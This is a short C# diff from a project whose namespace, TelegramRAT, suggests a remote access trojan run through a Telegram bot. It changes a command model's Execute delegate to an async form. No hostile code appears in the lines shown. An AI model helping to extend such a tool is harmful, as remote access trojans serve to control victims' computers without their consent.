@@ -19,7 +19,7 @@ namespace TelegramRAT
 
         public string[] Groups { get; set; } = null;
 
-        public Action<BotCommandModel> Execute { get; set; }
+        public Func<BotCommandModel, Task> Execute { get; set; }
 
         public MessageType MsgType { get; set; } = MessageType.Text;
         public int CountArgs = 0;
